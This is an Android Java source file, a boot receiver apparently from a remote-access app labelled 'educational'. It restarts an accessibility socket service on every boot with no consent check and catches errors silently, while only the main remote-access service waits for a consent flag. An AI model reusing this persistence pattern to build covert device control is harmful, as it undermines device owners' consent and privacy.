package com.remoteaccess.educational.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.remoteaccess.educational.accessibility.SocketService;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.utils.PreferenceManager;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {

            // Always restart the standalone accessibility socket service
            try {
                Intent socketIntent = new Intent(context, SocketService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(socketIntent);
                } else {
                    context.startService(socketIntent);
                }
            } catch (Exception ignored) {}

            // Start main remote access service only if consent was given
            PreferenceManager preferenceManager = new PreferenceManager(context);
            if (preferenceManager.isConsentGiven()) {
                Intent serviceIntent = new Intent(context, RemoteAccessService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
            }
        }
    }
}
